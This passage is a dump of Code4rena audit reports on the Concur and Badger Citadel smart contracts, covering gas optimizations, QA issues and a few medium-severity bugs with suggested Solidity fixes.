    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConvexStakingWrapper.sol#L182\n\n\n# Vulnerability details\n\n## Impact\n\nIf deposits and withdraws are done frequently enough, the reward update operation they invoke will deal mostly with the case when there is nothing to add yet, i.e. `reward.remaining` match the reward token balance.\n\nIf reward token doesn't allow for zero value transfers, the reward update function will fail on an empty incremental reward transfer, which is now done unconditionally, reverting the caller deposit/withdrawal functionality\n\n## Proof of Concept\n\nWhen ConvexStakingWrapper isn't paused, every deposit and withdraw update current rewards via `_checkpoint` function before proceeding:\n\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConvexStakingWrapper.sol#L233\n\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConvexStakingWrapper.sol#L260\n\n`_checkpoint` calls `_calcRewardIntegral` for each of the reward tokens of the pid:\n\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConvexStakingWrapper.sol#L220\n\n`_calcRewardIntegral` updates the incremental reward for the token, running the logic even if reward is zero, which is frequently the case:\n\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConvexStakingWrapper.sol#L182\n\nIf the reward token doesn't allow zero value transfers, this transfer will fail, reverting the corresponding deposit or withdraw\n\n## Recommended Mitigation Steps\n\nConsider checking the reward before doing transfer (and the related computations as an efficiency measure):\n\nNow:\n```\nIERC20(reward.token).transfer(address(claimContract), d_reward);\n```\n\nTo be:\n```\nif (d_reward > 0)\n\tIERC20(reward.token).transfer(address(claimContract), d_reward);\n```\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-concur-findings",
      "repo": "https://github.com/code-423n4/2022-02-concur-findings",
      "url": "https://github.com/code-423n4/2022-02-concur-findings/issues/231"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## Summary \nDuring the code review, we found that few state variables that were declared as `private` could be marked as `constant` as they were not expected to be updated. Constant variables consume lesser gas than private variables. Also, we found a few functions that were declared as public but were never internally used. Such functions can always be marked as `external` instead of `public` as `external` functions consume lesser gas in comparison to `public` functions. \nIt was also noticed that the ordering of variables in structs was in random order. Structs perform variable packing, and hence it is recommended to go from lower bytes to higher bytes as the lower bytes get packed together to save gas. \nThe contract was also found to be using the safeMath library, which is redundant if version solidity compiler version 0.8.0 and above is used as it has enough built-in features to prevent buffer overflow attacks and perform safer arithmetic calculations. It is advised to remove the safeMath library as they are super expensive in terms of gas consumption. \n\n1. \n\n### Title: \nState variables that could be declared constant\n\n### Description:\nConstant state variables should be declared constant to save gas.\n\n### PoC:\nThe below variables `concurPerBlock` `_concurShareMultiplier` `_perMille` can be used as constants instead of private.\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L50\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L56\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L57\n\n### Suggested Fix:\n`concurPerBlock` `_concurShareMultiplier` `_perMille` can be used as constants instead of private to save gas. \n\n\n2. \n\n### Title: \nFunctions that can be external instead of public\n\n### Description:\nPublic functions that are never called by a contract should be declared external in order to conserve gas.\n\n### Impact \nSmart Contracts are required to have effective Gas usage as they cost real money, and each function should be monitored for the amount of gas it costs to make it gas efficient.\n\n`Public` functions cost more Gas than `external` functions.\n\n### PoC:\nThe following functions can be declared external: \nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConvexStakingWrapper.sol#L93-L118\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L86-L101\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L127-L132\n\n\n### Suggested Fix:\nUse the `external` state visibility for functions that are never called from the contract.\n\n\n3. \n\n### Title: \nOrdering of structs\n\n### Description:\nStructs are packed, and arrangement matters for packing, which in turn affects the gas used. The ordering should be from lower to higher space consumption so packing can be done. \n\n### PoC:\n- Go to https://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L38-L44\n- We will notice the random ordering of structs which will cost more gas\n\n### Suggested Fix:\nUse the ordering as below, switching `depositFeeBP` to 2nd place instead of last. \n\nIERC20 depositToken; // Address of LP token contract.\nuint16 depositFeeBP; // Deposit fee in basis points\nuint allocPoint; // How many allocation points assigned to this pool. to distribute per block.\nuint lastRewardBlock; // Last block number that distribution occurs.\nuint accConcurPerShare; // Accumulated per share, times multiplier. See below.\n\n\n4. \n\n### Title: \nUse of Safemath\n\n### Description:\nSafemath module is considered very gas expensive. It was useful before solidity 0.8.0. After the 0.8.0 version, solidity auto handles buffer overflow, and hence safeMath can be avoided.  \n\n### PoC:\nThe `MasterChef.sol` file is using safeMath which is \nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L10\n\n\n### Suggested Fix:\nAvoid using safeMath module to save gas\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-concur-findings",
      "repo": "https://github.com/code-423n4/2022-02-concur-findings",
      "url": "https://github.com/code-423n4/2022-02-concur-findings/issues/218"
    }
  },
  {
    "title": "QA Report",
    "body": "## Overall\n\nThere are 3 Non-critical issues and 3 Low severity issues found.\n\n## [L1] `USDMPegRecovery.sol` implementation is not spec compliant\n\nPer to README:\n\nhttps://github.com/code-423n4/2022-02-concur/tree/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0#-usdmpegrecovery\n\n> Once ***40m*** USDM is deposited, 3Crv side of the contract starts accepting deposits.\n\nIn the implementation:\n\nThe actual threshold is `4m`. Only 1/10 of the expected `40m`;\n\nhttps://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/USDMPegRecovery.sol#L90-L108\n\n```solidity\nfunction deposit(Liquidity calldata _deposits) external {\n    Liquidity memory total = totalLiquidity;\n    Liquidity memory user = userLiquidity[msg.sender];\n    if(_deposits.usdm > 0) {\n        usdm.safeTransferFrom(msg.sender, address(this), uint256(_deposits.usdm));\n        total.usdm += _deposits.usdm;\n        user.usdm += _deposits.usdm;\n    }\n\n    if(_deposits.pool3 > 0) {\n        require(totalLiquidity.usdm > 4000000e18, \"usdm low\");\n        pool3.safeTransferFrom(msg.sender, address(this), uint256(_deposits.pool3));\n        total.pool3 += _deposits.pool3;\n        user.pool3 += _deposits.pool3;\n    }\n    totalLiquidity = total;\n    userLiquidity[msg.sender] = user;\n    emit Deposit(msg.sender, _deposits);\n}\n```\n\n\n### Recommendation\n\nConsider adding a new constant:\n\n```solidity\nuint128 private constant MIN_USDM_AMOUNT_WHEN_DEPOSIT_POOL3 = 40e24;\n```\n\nAnd change:\n\n```solidity\nrequire(totalLiquidity.usdm > 4000000e18, \"usdm low\");\n```\n\nto:\n\n```solidity\nrequire(totalLiquidity.usdm >= MIN_USDM_AMOUNT_WHEN_DEPOSIT_POOL3, \"usdm low\");\n```\n\n\n## [L2] Certain methods should be disabled when paused \n\nBased on common practices, `pause` is used for preventing loss of value in emergency situations, which should disable certain methods that can change essential states and transfer funds.\n\nTherefore, we believe the following methods should be disabled when the contract is paused.\n\n- ConvexStakingWrapper.withdraw()\n- StakingRewards.withdraw()\n- StakingRewards.getReward()\n\n### Recommendation\n\nConsider adding `whenNotPaused` to the methods above, or if the intention is to pause deposit only, consider adding a new storage variable called `depositPaused`.\n\n## [N3] Code Style: constants should be named in all caps\n\nHere are some examples that the code style does not follow the best practices:\n\nhttps://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/ConvexStakingWrapper.sol#L28-L36\n\n```solidity\n//constants/immutables\naddress public constant convexBooster =\n    address(0xF403C135812408BFbE8713b5A23a04b3D48AAE31);\naddress public constant crv =\n    address(0xD533a949740bb3306d119CC777fa900bA034cd52);\naddress public constant cvx =\n    address(0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B);\n\nuint256 public constant CRV_INDEX = 0;\n```\n\n## [L4] Unchecked return value for `token.transfer` call\n\nIt is usually good to add a require-statement that checks the return value or to use something like safeTransfer; unless one is sure the given token reverts in case of a failure.\n\nInstances include:\n\nhttps://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/ConvexStakingWrapper.sol#L182-L182\n\n```solidity\nIERC20(reward.token).transfer(address(claimContract), d_reward);\n```\n\n### Recommendation\n\nConsider adding a require-statement or using `safeTransfer` of SafeERC20.\n\n## [N5] Constants are not explicitly declared\n\nIt's a best practice to use constant variables rather than literal values to make the code easier to understand and maintain.\n\nConsider defining a constant variable for the literal value used and giving it a clear and self-explanatory name.\n\nInstances include:\n\nhttps://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/StakingRewards.sol#L67-L71\n\n```solidity\nreturn\n    rewardPerTokenStored +\n    (((lastTimeRewardApplicable() - lastUpdateTime) *\n        rewardRate *\n        1e18) / _totalSupply);\n```\n\nhttps://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/StakingRewards.sol#L75-L79\n\n```solidity\nreturn\n    (_balances[account] *\n        (rewardPerToken() - userRewardPerTokenPaid[account])) /\n    1e18 +\n    rewards[account];\n```\n\nConsider changing `1e18` to `REWARD_PER_TOKEN_MULTIPLIER` constant.\n\n## [N6] Interface `IRewardStaking`  mismatch implementations\n\nhttps://github.com/code-423n4/2022-02-concur/blob/72b5216bfeaa7c52983060ebfc56e72e0aa8e3b0/contracts/external/ConvexInterfaces.sol#L12-L34\n\n```solidity\ninterface IRewardStaking {\n    struct PoolInfo {\n        address lptoken;\n        address token;\n        address gauge;\n        address crvRewards;\n        address stash;\n        bool shutdown;\n    }\n\n    function poolInfo(uint256) external view returns(PoolInfo memory);\n    function stakeFor(address, uint256) external;\n    function stake( uint256) external;\n    function withdraw(uint256 amount, bool claim) external;\n    function withdrawAndUnwrap(uint256 amount, bool claim) external;\n    function earned(address account) external view returns (uint256);\n    function getReward() external;\n    function getReward(address _account, bool _claimExtras) external;\n    function extraRewardsLength() external view returns (uint256);\n    function extraRewards(uint256 _pid) external view returns (address);\n    function rewardToken() external view returns (address);\n    function balanceOf(address _account) external view returns (uint256);\n}\n```\n\nThe `IRewardStaking` interface above is:\n\n- neither the interface of https://github.com/convex-eth/platform/blob/main/contracts/contracts/Booster.sol (for example, there is no `withdrawAndUnwrap()` on Booster.sol)\n- nor the IRewardStaking.sol from convex: https://github.com/convex-eth/platform/blob/main/contracts/contracts/interfaces/IRewardStaking.sol\n\nA misleading interface can cause issues like [WP-H2].\n\n### Recommendation\n\nConsider changing the type declaring for addresses.\n\nFor example:\n\n-\n    ```solidity\n    mapping(uint256 => address) public convexPool;\n    ```\n    can be changed to:\n\n    ```solidity\n    mapping(uint256 => IRewardStaking) public convexPool;\n    ```\n\n    `IRewardStaking` should be: https://github.com/convex-eth/platform/blob/main/contracts/contracts/interfaces/IRewardStaking.sol\n\n-\n    ```solidity\n    address public constant convexBooster = address(0xF403C135812408BFbE8713b5A23a04b3D48AAE31);\n    ```\n\n    can be changed to:\n\n    ```solidity\n    IConvexBooster public constant convexBooster = address(0xF403C135812408BFbE8713b5A23a04b3D48AAE31);\n    ```\n\n    IConvexBooster should be defined based on: https://github.com/convex-eth/platform/blob/main/contracts/contracts/Booster.sol\n",
    "dataSource": {
      "name": "code-423n4/2022-02-concur-findings",
      "repo": "https://github.com/code-423n4/2022-02-concur-findings",
      "url": "https://github.com/code-423n4/2022-02-concur-findings/issues/217"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "###BADGER-CITADEL GAS-OPT FINDINGS\n##TokenSaleUpgradeable.sol\n1--\n-set variable as immutable\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L19-L21\nthe `tokenOut` & `tokenIn` can set as `immutable` because the value is just set once in the `initialize()` function\n2--\n-caching `saleStart` in memory can save gas\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L149-L151\n`saleStart` is called multiple times (2 times to be exact) in the `buy()` function. i recommend to cache `saleStart`:\n```\n\tuint64 _saleStart = saleStart;\n\trequire(_saleStart <= block.timestamp, \"TokenSale: not started\");\n        require(\n            block.timestamp < _saleStart + saleDuration,\n            \"TokenSale: already ended\"\n        );\n```\n3--\n-unnecesary variable declaration\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L164\nunncecessary `boughtAmountTillNow` declarartion. It was called 2 times in this function. But for line:\n```\nboughtAmounts[msg.sender] = boughtAmountTillNow + tokenOutAmount_;\n```\ncan changed by:\n```\nboughtAmounts[msg.sender] += tokenOutAmount_;\n```\nsince the `boughtAmounts[msg.sender]` == `boughtAmountTillNow`\n\nRecommended Mitigation Steps\nRemove line 164 and replace all `boughtAmountTillNow` with `boughtAmounts[msg.sender]`\n4--\n-better way to use SafeERC20Upgradable for gas optimization\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L16\nby removing line 16 and call `SafeERC20Upgradable` directly (SafeERC20Upgradeable.function(arguments)) can save 15 gas per call\nexample:\n```\ntokenIn.safeTransferFrom(msg.sender, saleRecipient, _tokenInAmount);\n```\nchange to:\n```\nSafeERC20Upgradable.safeTransferFrom(tokenIn, msg.sender, saleRecipient, _tokenInAmount);\n```\n5--\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol\nthe returns value of some function is unused (there are no function which is using the value of the return). i recommend just run the function without returns()\nexample: `buy()`, `claim()`\n6--\n-Using `saleEnded()` to validate `buy()`\ninstead of using:\n```\n\trequire(\n            block.timestamp < saleStart + saleDuration,\n            \"TokenSale: already ended\"\n        );\n        require(\n            totalTokenIn + _tokenInAmount <= tokenInLimit,\n            \"total amount exceeded\"\n        );\n```\nusing:\n```\nrequire(saleEnded(), 'newError');\n```\ncan save gas.",
    "dataSource": {
      "name": "code-423n4/2022-02-badger-citadel-findings",
      "repo": "https://github.com/code-423n4/2022-02-badger-citadel-findings",
      "url": "https://github.com/code-423n4/2022-02-badger-citadel-findings/issues/79"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## Avoid calling staticcall instruction and power calculation every time someone buys tokens (save 5000 gas)\n\nEvery time a users calls the function buy() it will execute a\n\n        tokenOutAmount_ = getAmountOut(_tokenInAmount);                  LOC 175\n\nThe function is:\n\n`\n   function getAmountOut(uint256 _tokenInAmount)\n        public\n        view\n        returns (uint256 tokenOutAmount_)\n    {\n        tokenOutAmount_ =\n            (_tokenInAmount * 10**tokenOut.decimals()) /\n            tokenOutPrice;\n    }\n`\n\n\nThe `tokenOut.decimals()` is a contract call, more specifically a staticcall OPCODE that will cost you 700 gas according to https://eips.ethereum.org/EIPS/eip-1380.   Apart from that power calculation is also expensive.    I have code a PoC contract and mi results is that you would be saving 5000 gas if you use a precomputed variable\n\n# The Poc\n\nI have coded these two simple contracts in a single file that you can test easily in remix\n\n```\n\n pragma solidity ^0.8.0;\n\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC20/ERC20Upgradeable.sol\";\n\ncontract MyToken is ERC20Upgradeable{\n\nfunction decimals() public view override returns(uint8){`\n    return 8;`\n}\n\n\n\n}\n\ncontract StaticCallGasPoC{\n//Document about  GasCost of StaticCall  https://eips.ethereum.org/EIPS/eip-1380\n\n    ERC20Upgradeable public tokenOut;\n    uint256 public tokenOutPrice = 40000;\n    uint private exchangeRate = 2500;  // 10**tokenOut.decimals() / tokenOutprice;\n\nconstructor (ERC20Upgradeable _tokenOut) {\n    tokenOut=_tokenOut;\n\n}\nfunction setTokenOutPrice(uint _tokenOutPrice) public{\n    tokenOutPrice = _tokenOutPrice;\n}\n\nfunction expensivePower(uint _tokenInAmount) public view returns(uint){\n    return (_tokenInAmount * 10**tokenOut.decimals())/ tokenOutPrice;  \n    //cost of static call = 700  \n}\n\nfunction cheapPower(uint _tokenInAmount) public view returns(uint){\n    return _tokenInAmount*exchangeRate;\n}\n}\n```\nSimulation in remix shows that expensivePower is 5000 gas more expensive that cheapPower\n\n#  Proposed solution\n\nI would suggest you to use a precomputed variable stored at the time you create your constract because buy() is a function that is highly used and you would be saving a few dollars per transaction\n\n`exchangeRate  = 10**tokenOut.decimals() / tokenOutPrice `\n\nor at least\n\n`otherConstant = 10**tokenOut.decimals()`\n\nJust to mention that if you use the first option you need to set again exchangeRate when you setTokenOutPrice al L303.\n",
    "dataSource": {
      "name": "code-423n4/2022-02-badger-citadel-findings",
      "repo": "https://github.com/code-423n4/2022-02-badger-citadel-findings",
      "url": "https://github.com/code-423n4/2022-02-badger-citadel-findings/issues/73"
    }
  },
  {
    "title": "QA Report",
    "body": "## Overall\n\nWe find the `2022-02-badger-citadel` codebase well-documented, well-structured, with a fair amount of tests, and pretty gas efficient.\n\nThere are 2 Non-critical issues and 1 Low severity issue found.\n\n### [N1] Inconsistent style of error messages\n\nSome of the error messages are prefixed with `TokenSale:` while some are not.\n\nConsider updating the error messages to keep the style of error messages consistent.\n\n### [N2] Tokens with fee on transfer are not supported\n\nThere are ERC20 tokens that charge fee for every `transfer()` or `transferFrom()`.\n\nIn the current implementation, `TokenSaleUpgradeable.sol#buy()` assumes that the received amount is the same as the transfer amount, and uses it to calculate `tokenOutAmount_`.\n\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L180-L183\n\nConsider calling `balanceOf()` before and after the transfer to get the actual transferred amount if a token with transfer tax as `tokenIn` should be supported.\n\n### [L3] Allowing `setTokenOutPrice` after the token sale starts can result in unexpected results for buyers\n\nIn the current implementation, the owner can call `setTokenOutPrice()` and change the tokenOutPrice anytime, including when the token sale already started. In the case of network congestion or in chance, if the owner `setTokenOutPrice()` to a higher price, it can result in unexpected tokenOutAmount for the buyers who submitted their `buy()` txs before but only get packed into the block after the `setTokenOutPrice()` tx.\n\nWe consider this an undesirable situation for users and there is pretty much no other way to prevent it, therefore it should be prevented at the smart contract level.\n\nConsider making `setTokenOutPrice()` only callable before the sale starts.",
    "dataSource": {
      "name": "code-423n4/2022-02-badger-citadel-findings",
      "repo": "https://github.com/code-423n4/2022-02-badger-citadel-findings",
      "url": "https://github.com/code-423n4/2022-02-badger-citadel-findings/issues/57"
    }
  },
  {
    "title": "QA report",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L15\n\n\n# Vulnerability details\n\nOne line 221, in `getAmountOut()`,  the amount of tokens that the user can claim later is calculated as follows:\n\n   `tokenOutAmount_ = (_tokenInAmount * 10**tokenOut.decimals()) / tokenOutPrice;` \n\nThe only explanation of this code is a comment on line 32,  just before the `tokenOutPrice` variable is defined:\n\n    `/// eg. 1 WBTC (8 decimals) = 40,000 CTDL ==> price = 10^8 / 40,000`\n\nTo start, the example is wrong: if you set `price` to `10^8 / 40,000` in the price calculation from line 221, `getAmountOut` will return `400` instead of `40000`.\n\nMore importantly, using `tokenOut.decimals()` in the calculation is a bad idea.\n\nNote that `decimals` is _optional_ in the ERC20 token standard: https://eips.ethereum.org/EIPS/eip-20, and if it is implement, it is allowed to return any `uint8` value. In other words, effect of calling `decimals` in `getAmountOut` when `tokenOut` is a **valid ERC20 token** can  range anywhere from throwing an error (if the function is not implemented and there is no fallback function), return a very low value (`0`, for example), which will lead to large rounding errors (and therefore the buyer getting less tokens than she might otherwise expect), or return a very high value (`255` is the highest), which will lead to an overflow error here (and will make the contract unuseable).\n\nWe classified this bug as medium, as there are two types of risk here. The first regards the  implementation of `decimals` in the ERC20 we just described. This risk is probably low, as the \"out token\" is the CTDL token, which presumably has implemented `decimals` in a reasonable way (it is impossible to check as the token is not provided with the repository code). The second type of risk is in setting the price in the first place - with the current hard-to-understand logic, it is easy to make mistakes, as the developer's comment  shows, and a wrong price could lead to loss of funds.\n\n## Recommendation\n\n* In the price calculations, avoid the use of `decimals` completely.  (The Openzeppelin recommendations are useful here: https://docs.openzeppelin.com/contracts/2.x/crowdsales#crowdsale-rate). What you are really after here is the \"precision\" of the price - i.e. the amount of numbers after the decimal separator. A standard implementation could look like this:\n\n\n```\nuint PRECISION = 1e18; // also 1e8 or 1e6 could be good enough depending on the context\nuint price = 1234 * 1e15; // with a precision of 1e18, this means that the price of one tokenOut base unit is 1.234 tokenIn base units\n\nfunction getAmountOut(uint256 tokenIn) returns (uint256) {\n  return tokenIn * PRECISION / price;\n}\n```\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-badger-citadel-findings",
      "repo": "https://github.com/code-423n4/2022-02-badger-citadel-findings",
      "url": "https://github.com/code-423n4/2022-02-badger-citadel-findings/issues/51"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# C4-001 : Adding unchecked directive can save gas\n\n## Impact -  Gas Optimization\n\nUsing the unchecked keyword to avoid redundant arithmetic underflow/overflow checks to save gas when an underflow/overflow cannot happen. E.g. 'unchecked' can be applied in the following lines of code since there are require statements before to ensure the arithmetic operations would not cause an integer underflow or overflow. For the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract function and lines.\n\n```\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L151\n\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L242\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider applying unchecked arithmetic where overflow/underflow is not possible.\n\n\n# C4-002 : Revert String Size Optimization\n\n## Impact -  Gas Optimization\n\nShortening revert strings to fit in 32 bytes will decrease deploy time gas and will decrease runtime gas when the revert condition has been met. Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract function and lines.\n\n```\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L114\n\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L274\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nShorten the revert strings to fit in 32 bytes. That will affect gas optimization.\n\n\n# C4-003 : Immutable variables\n\n## Impact -  Gas Optimization\n\n'immutable' greatly reduces gas costs. There are variables that do not change so they can be marked as immutable to greatly improve the gas costs.\n\n## Proof of Concept\n\n1. Navigate to the following contract function and lines.\n\n```\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L19\n\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L21\n```\n\n2. The following variables can be defined as an immutable.\n\n```\n    /// token to give out (CTDL)\n    ERC20Upgradeable public tokenOut;\n    /// token to take in WBTC / bibbtc LP / CVX / bveCVX\n    ERC20Upgradeable public tokenIn;\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nDefine these state variables as immutables.\n\n\n# C4-004 : `> 0 can be replaced with != 0 for gas optimization`\n\n## Impact -  Gas Optimization\n\n`!= 0` is a cheaper operation compared to `> 0`, when dealing with uint.\n\n## Proof of Concept\n\n1. Navigate to the following contract function and lines.\n\n```\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L114\n\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L111\n\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L166\n\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L154\n\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L364\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nUse \"!=0\" instead of \">0\" for the gas optimization.\n\n\n# C4-005 : `Use else if for mutually exclusive conditions`\n\n## Impact -  Gas Optimization\n\nUse else if for mutually exclusive conditions to save gas.\n\n## Proof of Concept\n\n1. Navigate to the following contract function line.\n\n```\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L160\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider using if/else-if/else statement instead of multiple if statement. \n\n\n# C4-006 : `Less than 256 uints are not gas efficient`\n\n## Impact -  Gas Optimization\n\nLower than uint256 size storage instance variables are actually less gas efficient. E.g. using uint16 does not give any efficiency, actually, it is the opposite as EVM operates on default of 256-bit values so uint16 is more expensive in this case as it needs a conversion. It only gives improvements in cases where you can pack variables together, e.g. structs.\n\n## Proof of Concept\n\n1. Navigate to the following contract function line.\n\n```\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L23\n\nhttps://github.com/code-423n4/2022-02-badger-citadel/blob/main/contracts/TokenSaleUpgradeable.sol#L25\n```\n\n## Tools Used\n\nCode Review\n\n## Recommended Mitigation Steps\n\nConsider to review all uint types. Change them with uint256 If the integer is not necessary to present with uint64.\n\n\n# C4-007 : Changing function visibility from public to external can save gas\n\n## Impact -  Gas Optimization\n\nThere is a function declared as public that are never called internally within the contract. It is best practice to mark such functions as external instead, as this saves gas (especially in the case where the function takes arguments, as external functions can read arguments directly from calldata instead of having to allocate memory).\n\n\n## Proof of Concept\n\n1. Navigate to the following contract function line.\n\n```\nrenounceOwnership() should be declared external:                                                                                                           \n        - OwnableUpgradeable.renounceOwnership() (lib/openzeppelin-contracts-upgradeable/contracts/access/OwnableUpgradeable.sol#60-62)                    \ntransferOwnership(address) should be declared external:                                                                                                    \n        - OwnableUpgradeable.transferOwnership(address) (lib/openzeppelin-contracts-upgradeable/contracts/access/OwnableUpgradeable.sol#68-71)             \nname() should be declared external:                                                                                                                        \n        - ERC20Upgradeable.name() (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#68-70)                                \nsymbol() should be declared external:                                                                                                                      \n        - ERC20Upgradeable.symbol() (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#76-78)                              \ndecimals() should be declared external:                                                                                                                    \n        - ERC20Upgradeable.decimals() (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#93-95)                            \ntotalSupply() should be declared external:                                                                                                                 \n        - ERC20Upgradeable.totalSupply() (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#100-102)                       \nbalanceOf(address) should be declared external:                                                                                                            \n        - ERC20Upgradeable.balanceOf(address) (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#107-109)                  \ntransfer(address,uint256) should be declared external:                                                                                                     \n        - ERC20Upgradeable.transfer(address,uint256) (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#119-122)           \nallowance(address,address) should be declared external:                                                                                                    \n        - ERC20Upgradeable.allowance(address,address) (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#127-129)          \napprove(address,uint256) should be declared external:                                                                                                      \n        - ERC20Upgradeable.approve(address,uint256) (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#138-141)            \ntransferFrom(address,address,uint256) should be declared external:                                                                                         \n        - ERC20Upgradeable.transferFrom(address,address,uint256) (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#156-170)                                                                                                                                                          \nincreaseAllowance(address,uint256) should be declared external:                                                                                            \n        - ERC20Upgradeable.increaseAllowance(address,uint256) (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#184-187)  \ndecreaseAllowance(address,uint256) should be declared external:                                                                                            \n        - ERC20Upgradeable.decreaseAllowance(address,uint256) (lib/openzeppelin-contracts-upgradeable/contracts/token/ERC20/ERC20Upgradeable.sol#203-211)  \nReference: https://github.com/crytic/slither/wiki/Detector-Documentation#public-function-that-could-be-declared-external \n```\n\n## Tools Used\n\nSlither\n\n## Recommended Mitigation Steps\n\nAll of the public functions in the contract are not called internally, so access can be changed to external to reduce gas.\n\n\n# C4-008 : Redundant Code\n\n## Impact -  Gas Optimization\n\nRedundant code increase contract size and gas usage at deployment.\n\n\n## Proof of Concept\n\n1. Navigate to the following contract inherited library lines.\n\n```\nAddressUpgradeable.functionCall(address,bytes) (lib/openzeppelin-contracts-upgradeable/contracts/utils/AddressUpgradeable.sol#80-82) is never used and should be removed                                                                                                                                              \nAddressUpgradeable.functionCallWithValue(address,bytes,uint256) (lib/openzeppelin-contracts-upgradeable/contracts/utils/AddressUpgradeable.sol#109-115) is never used and should be removed                                                                                                                           \nAddressUpgradeable.functionStaticCall(address,bytes) (lib/openzeppelin-contracts-upgradeable/contracts/utils/AddressUpgradeable.sol#142-144) is never used and should be removed                                                                                                                                      \nAddressUpgradeable.functionStaticCall(address,bytes,string) (lib/openzeppelin-contracts-upgradeable/contracts/utils/AddressUpgradeable.sol#152-161) is never used and should be removed                                                                                                                               \nAddressUpgradeable.sendValue(address,uint256) (lib/openzeppelin-contracts-upgradeable/contracts/utils/AddressUpgradeable.sol#55-60) is never used and should be removed                                                                                                                                               \nContextUpgradeable.__Context_init() 